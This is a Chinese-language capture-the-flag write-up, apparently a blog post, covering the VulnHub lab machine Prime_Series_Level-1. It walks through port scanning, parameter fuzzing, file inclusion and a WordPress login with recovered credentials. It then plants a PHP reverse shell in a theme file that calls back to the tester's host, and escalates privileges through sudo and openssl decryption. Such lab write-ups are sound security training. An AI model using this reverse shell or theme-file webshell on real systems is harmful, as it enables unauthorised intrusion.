@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/154585050?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# 靶机信息
+Prime_Series_Level-1是vulnhub中的一台困难难度的靶机
+## 初始信息枚举
+
+tcp和udp端口扫描，尽量扫描两次，以防止网络问题造成遗漏
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
+└─$ nmap -sT -p- --min-rate 10000 192.168.218.193 -oA nmapScan/tcPorts
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:46 EDT
+Nmap scan report for 192.168.218.193
+Host is up (0.00015s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 00:0C:29:17:A8:CC (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.97 seconds
+
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
+└─$ nmap -sU -p- --min-rate 10000 192.168.218.193 -oA nmapScan/udPorts
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:46 EDT
+Warning: 192.168.218.193 giving up on port because retransmission cap hit (10).
+Nmap scan report for 192.168.218.193
+Host is up (0.00095s latency).
+All 65535 scanned ports on 192.168.218.193 are in ignored states.
+Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
+MAC Address: 00:0C:29:17:A8:CC (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 72.89 seconds
+```
+
+指定端口进行详细服务扫描和漏洞扫描
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
+└─$ nmap -sV -p22,80 -O 192.168.218.193 -oA nmapScan/detail
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:48 EDT
+Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
+ARP Ping Scan Timing: About 100.00% done; ETC: 09:48 (0:00:00 remaining)
+Nmap scan report for 192.168.218.193
+Host is up (0.00030s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+MAC Address: 00:0C:29:17:A8:CC (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.76 seconds
+                                                              
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]                                             
+└─$ nmap --script=vuln -p22,80 192.168.218.193 -oA nmapScan/vuln                                  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:49 EDT                                   
+Nmap scan report for 192.168.218.193                                                              
+Host is up (0.00032s latency).                                                                    
+                                                                                                  
+PORT   STATE SERVICE                                                                              
+22/tcp open  ssh                                                                                  
+80/tcp open  http                                                                                 
+|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)                     
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                  
+|_http-csrf: Couldn't find any CSRF vulnerabilities.                                              
+|_http-dombased-xss: Couldn't find any DOM based XSS.                                             
+| http-enum:                                                                                      
+|   /wordpress/: Blog                                                                             
+|_  /wordpress/wp-login.php: Wordpress login page.                                                
+| http-slowloris-check:                                                                           
+|   VULNERABLE:                                                                                   
+|   Slowloris DOS attack                                                                          
+|     State: LIKELY VULNERABLE                                                                    
+|     IDs:  CVE:CVE-2007-6750                                                                     
+|       Slowloris tries to keep many connections to the target web server open and hold           
+|       them open as long as possible.  It accomplishes this by opening connections to            
+|       the target web server and sending a partial request. By doing so, it starves              
+|       the http server's resources causing Denial Of Service.                                    
+|                                                                                                 
+|     Disclosure date: 2009-09-17                                                                 
+|     References:                                                                                 
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750                              
+|_      http://ha.ckers.org/slowloris/                                                            
+MAC Address: 00:0C:29:17:A8:CC (VMware)                                                           
+                                                                                                  
+Nmap done: 1 IP address (1 host up) scanned in 321.22 seconds   
+```
+
+信息不多，只有一个80端口开源利用，漏扫出来cms，看一下 web 页面，只有一张图片。">
+<meta property="og:title" content="Prime_Series_Level-1">
+<meta property="og:description" content="# 靶机信息
+Prime_Series_Level-1是vulnhub中的一台困难难度的靶机
+## 初始信息枚举
+
+tcp和udp端口扫描，尽量扫描两次，以防止网络问题造成遗漏
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
+└─$ nmap -sT -p- --min-rate 10000 192.168.218.193 -oA nmapScan/tcPorts
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:46 EDT
+Nmap scan report for 192.168.218.193
+Host is up (0.00015s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 00:0C:29:17:A8:CC (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.97 seconds
+
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
+└─$ nmap -sU -p- --min-rate 10000 192.168.218.193 -oA nmapScan/udPorts
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:46 EDT
+Warning: 192.168.218.193 giving up on port because retransmission cap hit (10).
+Nmap scan report for 192.168.218.193
+Host is up (0.00095s latency).
+All 65535 scanned ports on 192.168.218.193 are in ignored states.
+Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
+MAC Address: 00:0C:29:17:A8:CC (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 72.89 seconds
+```
+
+指定端口进行详细服务扫描和漏洞扫描
+```
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
+└─$ nmap -sV -p22,80 -O 192.168.218.193 -oA nmapScan/detail
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:48 EDT
+Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
+ARP Ping Scan Timing: About 100.00% done; ETC: 09:48 (0:00:00 remaining)
+Nmap scan report for 192.168.218.193
+Host is up (0.00030s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+MAC Address: 00:0C:29:17:A8:CC (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.76 seconds
+                                                              
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]                                             
+└─$ nmap --script=vuln -p22,80 192.168.218.193 -oA nmapScan/vuln                                  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:49 EDT                                   
+Nmap scan report for 192.168.218.193                                                              
+Host is up (0.00032s latency).                                                                    
+                                                                                                  
+PORT   STATE SERVICE                                                                              
+22/tcp open  ssh                                                                                  
+80/tcp open  http                                                                                 
+|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)                     
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                  
+|_http-csrf: Couldn't find any CSRF vulnerabilities.                                              
+|_http-dombased-xss: Couldn't find any DOM based XSS.                                             
+| http-enum:                                                                                      
+|   /wordpress/: Blog                                                                             
+|_  /wordpress/wp-login.php: Wordpress login page.                                                
+| http-slowloris-check:                                                                           
+|   VULNERABLE:                                                                                   
+|   Slowloris DOS attack                                                                          
+|     State: LIKELY VULNERABLE                                                                    
+|     IDs:  CVE:CVE-2007-6750                                                                     
+|       Slowloris tries to keep many connections to the target web server open and hold           
+|       them open as long as possible.  It accomplishes this by opening connections to            
+|       the target web server and sending a partial request. By doing so, it starves              
+|       the http server's resources causing Denial Of Service.                                    
+|                                                                                                 
+|     Disclosure date: 2009-09-17                                                                 
+|     References:                                                                                 
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750                              
+|_      http://ha.ckers.org/slowloris/                                                            
+MAC Address: 00:0C:29:17:A8:CC (VMware)                                                           
+                                                                                                  
+Nmap done: 1 IP address (1 host up) scanned in 321.22 seconds   
+```
+
+信息不多，只有一个80端口开源利用，漏扫出来cms，看一下 web 页面，只有一张图片。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://dehua-rd.github.io/post/Prime_Series_Level-1.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/154585050?v=4">
+<title>Prime_Series_Level-1</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">Prime_Series_Level-1</h1>
+<div class="title-right">
+    <a href="https://dehua-rd.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/dehua-rd/dehua-rd.github.io/issues/9" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>靶机信息</h1>
+<p>Prime_Series_Level-1是vulnhub中的一台困难难度的靶机</p>
+<h2>初始信息枚举</h2>
+<p>tcp和udp端口扫描，尽量扫描两次，以防止网络问题造成遗漏</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
+└─$ nmap -sT -p- --min-rate 10000 192.168.218.193 -oA nmapScan/tcPorts
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:46 EDT
+Nmap scan report for 192.168.218.193
+Host is up (0.00015s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 00:0C:29:17:A8:CC (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.97 seconds
+
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
+└─$ nmap -sU -p- --min-rate 10000 192.168.218.193 -oA nmapScan/udPorts
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:46 EDT
+Warning: 192.168.218.193 giving up on port because retransmission cap hit (10).
+Nmap scan report for 192.168.218.193
+Host is up (0.00095s latency).
+All 65535 scanned ports on 192.168.218.193 are in ignored states.
+Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
+MAC Address: 00:0C:29:17:A8:CC (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 72.89 seconds
+</code></pre>
+<p>指定端口进行详细服务扫描和漏洞扫描</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
+└─$ nmap -sV -p22,80 -O 192.168.218.193 -oA nmapScan/detail
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:48 EDT
+Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
+ARP Ping Scan Timing: About 100.00% done; ETC: 09:48 (0:00:00 remaining)
+Nmap scan report for 192.168.218.193
+Host is up (0.00030s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+MAC Address: 00:0C:29:17:A8:CC (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.76 seconds
+                                                              
+┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]                                             
+└─$ nmap --script=vuln -p22,80 192.168.218.193 -oA nmapScan/vuln                                  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 09:49 EDT                                   
+Nmap scan report for 192.168.218.193                                                              
+Host is up (0.00032s latency).                                                                    
+                                                                                                  
+PORT   STATE SERVICE                                                                              
+22/tcp open  ssh                                                                                  
+80/tcp open  http                                                                                 
+|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)                     
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                  
+|_http-csrf: Couldn't find any CSRF vulnerabilities.                                              
+|_http-dombased-xss: Couldn't find any DOM based XSS.                                             
+| http-enum:                                                                                      
+|   /wordpress/: Blog                                                                             
+|_  /wordpress/wp-login.php: Wordpress login page.                                                
+| http-slowloris-check:                                                                           
+|   VULNERABLE:                                                                                   
+|   Slowloris DOS attack                                                                          
+|     State: LIKELY VULNERABLE                                                                    
+|     IDs:  CVE:CVE-2007-6750                                                                     
+|       Slowloris tries to keep many connections to the target web server open and hold           
+|       them open as long as possible.  It accomplishes this by opening connections to            
+|       the target web server and sending a partial request. By doing so, it starves              
+|       the http server's resources causing Denial Of Service.                                    
+|                                                                                                 
+|     Disclosure date: 2009-09-17                                                                 
+|     References:                                                                                 
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750                              
+|_      http://ha.ckers.org/slowloris/                                                            
+MAC Address: 00:0C:29:17:A8:CC (VMware)                                                           
+                                                                                                  
+Nmap done: 1 IP address (1 host up) scanned in 321.22 seconds   
+</code></pre>
+<p>信息不多，只有一个80端口开源利用，漏扫出来cms，看一下 web 页面，只有一张图片。</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/786119d2-beaa-4662-bb56-b44ac2ac0584"><img width="1611" height="856" alt="Image" src="https://github.com/user-attachments/assets/786119d2-beaa-4662-bb56-b44ac2ac0584" style="max-width: 100%; height: auto; max-height: 856px;"></a></p>
+<p>扫一下目录</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
+└─$ gobuster dir -u 192.168.218.193 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,html,txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.218.193
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,php,html
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/dev                  (Status: 200) [Size: 131]
+/javascript           (Status: 301) [Size: 323] [--&gt; http://192.168.218.193/javascript/]
+/image.php            (Status: 200) [Size: 147]
+/index.php            (Status: 200) [Size: 136]
+/wordpress            (Status: 301) [Size: 322] [--&gt; http://192.168.218.193/wordpress/]
+/secret.txt           (Status: 200) [Size: 412]
+/server-status        (Status: 403) [Size: 303]
+/index.php            (Status: 200) [Size: 136]
+Progress: 224656 / 224660 (100.00%)
+===============================================================
+Finished
+===============================================================
+</code></pre>
+<p>还是有很多感兴趣的文件，先看 dev 目录</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/5501a18a-378c-44cb-8e4e-ade4c17df50a"><img width="1608" height="301" alt="Image" src="https://github.com/user-attachments/assets/5501a18a-378c-44cb-8e4e-ade4c17df50a" style="max-width: 100%; height: auto; max-height: 301px;"></a></p>
+<p>再看一下 secret.txt 文件，有提示。</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/7b597d5d-fc5a-45c8-aa13-3dbc9891696d"><img width="1608" height="656" alt="Image" src="https://github.com/user-attachments/assets/7b597d5d-fc5a-45c8-aa13-3dbc9891696d" style="max-width: 100%; height: auto; max-height: 656px;"></a></p>
+<p>看 location.txt 但是404，那我们先试试 fuzz 一下参数，感觉就是在 image.php 页面。扫了半天，各种换字典，结果最后换 index.php 扫出来了。这里通过更换--hc/hL/hh/hw过滤相同输出的结果</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
+└─$ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt  --hh 136 http://192.168.218.193/index.php?FUZZ=something
+
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.218.193/index.php?FUZZ=something
+Total requests: 6453
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                            
+=====================================================================
+
+000002206:   200        7 L      19 W       206 Ch      "file"                                                                                                                             
+
+Total time: 2.856316
+Processed Requests: 6453
+Filtered Requests: 6452
+Requests/sec.: 2259.203
+</code></pre>
+<p>成功挖掘到了正确的参数 <strong>file</strong> 提示没有挖掘到正确的文件。</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/59f46c9d-2cfb-44d2-9548-2fa3ab12f5d7"><img width="1918" height="940" alt="Image" src="https://github.com/user-attachments/assets/59f46c9d-2cfb-44d2-9548-2fa3ab12f5d7" style="max-width: 100%; height: auto; max-height: 940px;"></a></p>
+<p>根据前面的提示要查看这个文件 <strong>location.txt</strong>。</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/7ccaaa9d-3d98-4a23-b8af-708685d25cab"><img width="1919" height="1036" alt="Image" src="https://github.com/user-attachments/assets/7ccaaa9d-3d98-4a23-b8af-708685d25cab" style="max-width: 100%; height: auto; max-height: 1036px;"></a></p>
+<p>提示使用 <strong>secrettier360</strong> 参数在其他 php 页面尝试，那就应该是 image.php 了。</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c6dbd617-9b10-4573-938a-eb06938c347c"><img width="1919" height="1018" alt="Image" src="https://github.com/user-attachments/assets/c6dbd617-9b10-4573-938a-eb06938c347c" style="max-width: 100%; height: auto; max-height: 1018px;"></a></p>
+成功了，但是没别的提示了，试一下文件包含。成功了，并且有提示寻找 **password.txt** 
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/96044830-b707-4d4f-9155-57391f0cfca8"><img width="1919" height="1035" alt="Image" src="https://github.com/user-attachments/assets/96044830-b707-4d4f-9155-57391f0cfca8" style="max-width: 100%; height: auto; max-height: 1035px;"></a></p>
+**follow_the_ippsec** 有输出，可能就是密码
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/e2b3745f-e45f-4aec-8d51-89fd10d316f9"><img width="1913" height="684" alt="Image" src="https://github.com/user-attachments/assets/e2b3745f-e45f-4aec-8d51-89fd10d316f9" style="max-width: 100%; height: auto; max-height: 684px;"></a></p>
+试一下 ssh 的登录，尝试不通，想到之前漏洞扫描到有 wordpress ，试一下登录，成功使用 **victor:follow_the_ippsec** 这一组凭据登录 wp 后台
+<p>尝试上传插件 payload ，但是提示没有写权限，提示 <strong>父目录是否可以被写入</strong> ，那再找主题，也是同样的问题。</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/35409f7b-689e-4dae-89e2-c330ebda2917"><img width="1919" height="820" alt="Image" src="https://github.com/user-attachments/assets/35409f7b-689e-4dae-89e2-c330ebda2917" style="max-width: 100%; height: auto; max-height: 820px;"></a></p>
+<p>再翻翻翻，在主题编辑器中发现了 <strong>secret.php</strong>，那就确定了利用路径</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/09c18020-12b9-487d-9a04-6be0fe7c1e53"><img width="1919" height="1034" alt="Image" src="https://github.com/user-attachments/assets/09c18020-12b9-487d-9a04-6be0fe7c1e53" style="max-width: 100%; height: auto; max-height: 1034px;"></a></p>
+<p>直接写入反向shell</p>
+<pre class="notranslate"><code class="notranslate">&lt;?php
+$ip = '192.168.218.148';  
+$port = 4444;             
+$sock = fsockopen($ip, $port);
+$proc = proc_open('/bin/sh -i', 
+    array(0 =&gt; $sock, 1 =&gt; $sock, 2 =&gt; $sock), 
+    $pipes);
+?&gt;
+</code></pre>
+<p>开源cms，主题路径也能找到 <strong>/wordpress/wp-content/themes/twentynineteen/secret.php</strong><br>
+在kali上开启4444端口监听，然后访问。</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
+└─$ sudo nc -lvnp 4444
+[sudo] kali 的密码：
+listening on [any] 4444 ...
+connect to [192.168.218.148] from (UNKNOWN) [192.168.218.193] 54782
+/bin/sh: 0: can't access tty; job control turned off
+$ bash
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<h2>提权</h2>
+<p>成功拿到shell，那就开始提权了<br>
+先升级shell</p>
+<pre class="notranslate"><code class="notranslate">python3 -c 'import pty;pty.spawn("/bin/bash")'
+export SHELL=bash
+export TERM=xterm-256color 
+ctrl+z
+stty raw -echo;fg
+reset
+</code></pre>
+<pre class="notranslate"><code class="notranslate">www-data@ubuntu:/home/saket$ sudo -l
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (root) NOPASSWD: /home/saket/enc
+</code></pre>
+<p>使用 <strong>sudo -l</strong> 发现可以执行的sudo操作</p>
+<pre class="notranslate"><code class="notranslate">www-data@ubuntu:/home/saket$ ls -la
+total 36
+drwxr-xr-x 2 root root  4096 Aug 31  2019 .
+drwxr-xr-x 4 root root  4096 Aug 29  2019 ..
+-rw------- 1 root root    20 Aug 31  2019 .bash_history
+-rwxr-x--x 1 root root 14272 Aug 30  2019 enc
+-rw-r--r-- 1 root root    18 Aug 29  2019 password.txt
+-rw-r--r-- 1 root root    33 Aug 31  2019 user.txt
+www-data@ubuntu:/home/saket$ cat user.txt 
+af3c658dcf9d7190da3153519c003456
+www-data@ubuntu:/home/saket$ 
+</code></pre>
+<p>除了之前利用过的 password 文件还有一个 user.txt 执行一下 enc 问价，要输入密码，搜了一下 enc 关键字，发现是 <strong>openssl</strong> 的子命令，刚好 user.txt 输出的一串加密字符。怎么用呢<br>
+但是执行enc需要密码<code class="notranslate">find / -type f -exec grep -l "password" {} \; 2&gt;/dev/null</code>，但是一直找不到，就被卡死了，然后看红笔的视频，发现是搜索backup文件。密码在这里：</p>
+<pre class="notranslate"><code class="notranslate">www-data@ubuntu:/opt/backup/server_database$ ls -al
+total 12
+drwxr-xr-x 2 root root 4096 Aug 30  2019 .
+drwxr-xr-x 3 root root 4096 Aug 30  2019 ..
+-rw-r--r-- 1 root root   75 Aug 30  2019 backup_pass
+-rw-r--r-- 1 root root    0 Aug 30  2019 {hello.8}
+www-data@ubuntu:/opt/backup/server_database$ cat backup_pass 
+your password for backup_database file enc is 
+
+"backup_password"
+
+
+Enjoy!
+</code></pre>
+<p>使用 sudo 执行之后多了两个文件，enc.txt 和 key.txt ，</p>
+<pre class="notranslate"><code class="notranslate">www-data@ubuntu:/home/saket$ cat enc.txt 
+nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=
+www-data@ubuntu:/home/saket$ cat key.txt 
+I know you are the fan of ippsec.
+
+So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.
+www-data@ubuntu:/home/saket$ 
+</code></pre>
+<p>搜索发现要利用 key 解密 enc ，这里我也不会用openssl，看了红笔的视频，需要去爆破enc的加密算法，先使用 <code class="notranslate">openssl -h</code> 可以查看所有支持的算法，复制下来制作爆破文件</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
+└─$ cat ciphertype | tr ' ' '\n' | sed '/^$/d'
+</code></pre>
+<p>删除空格，加入换行，保证一个加密算法一行。<br>
+由于使用 openssl 的过程中需要将 key 的16进制格式，所以需要将上面的 <strong>ippsec</strong> 的md5格式转换成16进制格式</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
+└─$ echo -n "ippsec" | md5sum | awk -F' ' '{print $1}' | xxd -p | tr -d '\n' 
+33363661373463623363393539646531376436316462333035393163333964310a  
+</code></pre>
+<p>-n去除换行符，再匹配md5值，再转换成16进制，再去掉换行符</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/Prime1]
+└─$ for i in $(cat ciphertype);do cat enc.txt | openssl enc -d -a -$i -K 33363661373463623363393539646531376436316462333035393163333964310a 2&gt;&amp;/dev/null;echo $i ;done
+blake2b512
+blake2s256
+md4
+md5
+rmd160
+sha1
+sha224
+sha256
+sha3-224
+sha3-256
+sha3-384
+sha3-512
+sha384
+sha512
+sha512-224
+sha512-256
+shake128
+shake256
+sm3
+aes-128-cbc
+l{���[��7�ƏmfE��K����;0�`Z▒�� :�y��N�.�Fj�|z�x�G���rd��/��
+                                                          �:�Z91�yMV���@��S▒u����_j,����^+�FAC��ﴌ6���-��~��I�_���%���C���Դ��:��}T�q�4�同��#��ʛaes-128-ecb
+aes-192-cbc
+~I�l2UFײ:H3V�&gt;Z����§��N[sgħ��:��-]�����v;ń#�M��|g��
+            �|&amp;�As
+                  ��    �B0��mĖ�*�0r������{Hw� Ƕ�~�g�X�2▒�'+��+�����[D���5��d����!%o    {aes-192-ecb
+aes-256-cbc
+Dont worry saket one day we will reach to
+our destination very soon. And if you forget 
+your username then use your old password
+==&gt; "tribute_to_ippsec"
+
+Victor,aes-256-ecb
+</code></pre>
+<p>爆破出来了，enc是使用 <strong>aes-256-ecb</strong> 加密出来的，并成功解密了，获得一个密码，是saket用户的。<br>
+登录saket用户</p>
+<pre class="notranslate"><code class="notranslate">saket@ubuntu:/$ sudo -l
+Matching Defaults entries for saket on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User saket may run the following commands on ubuntu:
+    (root) NOPASSWD: /home/victor/undefeated_victor
